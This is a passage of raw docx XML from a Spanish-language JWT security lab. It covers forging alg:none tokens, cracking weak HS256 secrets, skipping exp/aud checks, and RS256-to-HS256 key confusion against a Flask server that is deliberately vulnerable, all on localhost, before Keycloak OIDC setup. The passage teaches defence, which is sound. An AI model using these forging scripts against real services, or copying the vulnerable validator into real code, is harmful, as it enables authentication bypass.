          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>TOKEN=$(cat token.txt)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -H "Authorization: Bearer $TOKEN" http://127.0.0.1:5000/safe | jq</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Paso 8 — Ataque </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>alg: none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python - &lt;&lt;'PY'</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>import jwt, datetime</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>payload = {"sub": "999", "scope": "admin", "aud": "lab", "iss": "https://mi-lab",</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">           "exp": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=1)}</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>forge = jwt.encode(payload, None, algorithm="none")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>open("forged_none.txt", "w").write(forge)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>print("token forjado:", forge)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>PY</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>FORGED=$(cat forged_none.txt)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>echo "--- /vuln/novalida (acepta) ---"</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -H "Authorization: Bearer $FORGED" http://127.0.0.1:5000/vuln/novalida | jq</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>echo "--- /safe (debe rechazar) ---"</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -H "Authorization: Bearer $FORGED" http://127.0.0.1:5000/safe | jq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/vuln/novalida</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> devuelve </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>claims</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>"scope":"admin"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>/safe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> responde error 401.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si el validador no verifica la firma (o confía en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>alg</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>), el token forjado pasa.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 9 — Crackear el secreto débil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cat &gt; crack.py &lt;&lt;'PY'</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>import jwt, sys</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>tok = open("token.txt").read().strip()</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>words = ["123456","password","secreto","clave","admin","secret","jwt","token"]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>for w in words:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    try:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        jwt.decode(tok, w, algorithms=["HS256"], options={"verify_aud": False})</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        print("CLAVE ENCONTRADA:", w); sys.exit(0)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    except Exception:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        pass</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>print("sin suerte (probá una wordlist real)")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>PY</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>python crack.py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CLAVE ENCONTRADA: secreto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con HS256, un secreto débil equivale a no tener firma. Con una wordlist real (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>rockyou.txt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">) y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>jwt_tool tok -C -d rockyou.txt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> el ataque es igual de directo.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Paso 10 — Token sin </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>exp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y con 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 xml:space="preserve"> equivocada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python - &lt;&lt;'PY'</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>import jwt</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># sin exp, audience distinta</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>t = jwt.encode({"sub":"777","scope":"admin","aud":"otra-app","iss":"https://mi-lab"},</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">               "secreto", algorithm="HS256")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>open("noexp.txt","w").write(t)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>print(t)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>PY</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>T=$(cat noexp.txt)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>echo "--- /vuln/debil (acepta) ---"; curl -s -H "Authorization: Bearer $T" http://127.0.0.1:5000/vuln/debil | jq</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>echo "--- /safe (debe rechazar por aud) ---"; curl -s -H "Authorization: Bearer $T" http://127.0.0.1:5000/safe | jq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/vuln/debil</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> acepta; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>/safe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> rechaza por </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>audience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los claims </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>exp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 xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>hay que exigirlos</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, no basta con que un token los traiga.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 11 — (Avanzado) Confusión RS256 → HS256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openssl genrsa -out priv.pem 2048</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>openssl rsa -in priv.pem -pubout -out pub.pem</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>cat &gt; lab_rs.py &lt;&lt;'PY'</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Servidor RS256 VULNERABLE A PROPÓSITO: acepta HS256 usando la clave pública como secreto.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>from flask import Flask, request, jsonify</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>import jwt</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>app = Flask(__name__)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>PUB = open("pub.pem").read()</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>@app.route("/r")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>def r():</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    tok = request.headers.get("Authorization","").replace("Bearer ","").strip()</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    return jsonify(ok=True, claims=jwt.decode(tok, PUB, algorithms=["HS256","RS256"]))</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>if __name__ == "__main__":</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    app.run(host="127.0.0.1", port=5001)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>PY</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>python lab_rs.py &amp;</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>sleep 2</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>python - &lt;&lt;'PY'</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>from pathlib import Path</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>import jwt</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>pub = Path("pub.pem").read_text()</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>forged = jwt.encode({"sub":"1","scope":"admin"}, pub, algorithm="HS256")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>open("rs_attack.txt","w").write(forged)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>PY</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -H "Authorization: Bearer $(cat rs_attack.txt)" http://127.0.0.1:5001/r | jq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el servidor acepta un token firmado con la </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>clave pública</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> como secreto HMAC.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permitir </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>algorithms=["HS256","RS256"]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> abre la confusión de algoritmos. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Regla: el algoritmo se fija en el validador, no en el token.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (RFC 8725.)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Parte C — OIDC, PKCE y refresh con Keycloak</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 12 — Levantar Keycloak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docker run -d --name keycloak -p 8080:8080 \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -e KEYCLOAK_ADMIN=admin -e KEYCLOAK_ADMIN_PASSWORD=admin \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  quay.io/keycloak/keycloak:latest start-dev</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Abrí http://localhost:8080 → Administration Console → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>admin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color w:val="1F3B66"/>
        </w:rPr>
        <w:t>admin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Paso 13 — Crear realm, cliente y usuario</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Realm:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> menú superior izquierdo → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Create realm</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → nombre </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>lab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Create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Cliente:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Clients</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Create client</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → Client ID </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>lab-web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Next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Client authentication: OFF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (cliente público) → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Next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Valid redirect URIs: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http://localhost:8989/callback</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Save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En la pestaña </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Advanced</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> del cliente: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
